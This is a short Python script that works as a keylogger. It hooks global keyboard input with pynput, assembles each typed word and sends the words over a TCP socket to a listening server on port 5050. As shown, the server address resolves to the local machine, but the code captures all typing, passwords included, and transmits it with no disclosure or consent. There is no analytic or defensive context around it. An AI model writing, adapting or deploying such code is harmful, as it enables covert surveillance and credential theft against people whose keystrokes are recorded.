from pynput.keyboard import Key, Controller, Listener
import socket
import threading

HEADER = 8
PORT = 5050
FORMAT = "utf-8"
DISCONECT_MESSAGE = "!DISCONNECT"
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

word = []

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

def on_press(key):
    global word
    try:
        word.append('{0}'.format(key.char))
    except AttributeError:
        if '{0}'.format(key) == "Key.space":
            send("".join(word))
            word = []
        elif '{0}'.format(key) == "Key.backspace":
            del word[-1]

listener = Listener(on_press=on_press)
listener.start()

while True:
    pass